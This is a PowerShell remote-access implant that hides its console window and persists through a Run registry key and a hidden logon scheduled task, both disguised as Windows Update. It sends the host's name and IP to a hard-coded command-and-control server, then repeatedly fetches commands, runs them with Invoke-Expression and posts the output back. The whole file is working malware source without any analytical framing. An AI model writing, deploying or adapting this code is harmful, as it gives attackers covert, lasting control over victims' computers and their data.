# Windows PowerShell Agent - Stealthy and Persistent
$ServerURL = "http://78.70.235.44:5000"
$AgentID = [guid]::NewGuid().ToString()
$Hostname = $env:COMPUTERNAME
$IP = (Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing).Content

# Stealth Mode - Hide window and run in background
if (-not ([System.Management.Automation.PSTypeName]'WinAPI').Type) {
    Add-Type -TypeDefinition @"
        using System;
        using System.Runtime.InteropServices;
        public class WinAPI {
            [DllImport("user32.dll")]
            public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
            [DllImport("kernel32.dll")]
            public static extern IntPtr GetConsoleWindow();
        }
"@
}
$consolePtr = [WinAPI]::GetConsoleWindow()
[WinAPI]::ShowWindow($consolePtr, 0) | Out-Null

# Add Registry Persistence
$RegPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$PSCommand = "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$($MyInvocation.MyCommand.Path)`""
Set-ItemProperty -Path $RegPath -Name "WindowsUpdateService" -Value $PSCommand -Force

# Scheduled Task Persistence (More Reliable)
$TaskName = "WindowsUpdateTask"
$Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$($MyInvocation.MyCommand.Path)`""
$Trigger = New-ScheduledTaskTrigger -AtLogOn
$Principal = New-ScheduledTaskPrincipal -UserId "$env:USERDOMAIN\$env:USERNAME" -LogonType Interactive
$Settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RunOnlyIfNetworkAvailable
Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Principal $Principal -Settings $Settings -Force | Out-Null

function Register-Agent {
    $Body = @{
        agent_id = $AgentID
        hostname = $Hostname
        ip = $IP
    } | ConvertTo-Json
    
    try {
        $Response = Invoke-WebRequest -Uri "$ServerURL/api/register" -Method POST -Body $Body -ContentType "application/json" -UseBasicParsing
        return $true
    } catch {
        return $false
    }
}

function Execute-Command {
    param($Command)
    try {
        $Output = Invoke-Expression $Command 2>&1 | Out-String
        return $Output
    } catch {
        return $_.Exception.Message
    }
}

function Start-Beacon {
    while ($true) {
        try {
            # Get tasks from C2 server
            $Tasks = Invoke-RestMethod -Uri "$ServerURL/api/tasks/$AgentID" -Method GET -UseBasicParsing
            
            foreach ($Task in $Tasks) {
                $TaskID = $Task.id
                $Command = $Task.command
                
                Write-Host "[+] Executing task #$TaskID : $Command" -ForegroundColor Green
                $Result = Execute-Command -Command $Command
                
                # Send results back
                $ResultBody = @{
                    task_id = $TaskID
                    result = $Result
                    agent_id = $AgentID
                } | ConvertTo-Json
                
                Invoke-WebRequest -Uri "$ServerURL/api/result" -Method POST -Body $ResultBody -ContentType "application/json" -UseBasicParsing | Out-Null
            }
        } catch {
            Write-Host "[-] Connection error: $($_.Exception.Message)" -ForegroundColor Red
        }
        
        Start-Sleep -Seconds 30
    }
}

# Main execution
while (-not (Register-Agent)) {
    Start-Sleep -Seconds 60
}

Write-Host "[+] Agent registered successfully! Starting beacon..." -ForegroundColor Green
Start-Beacon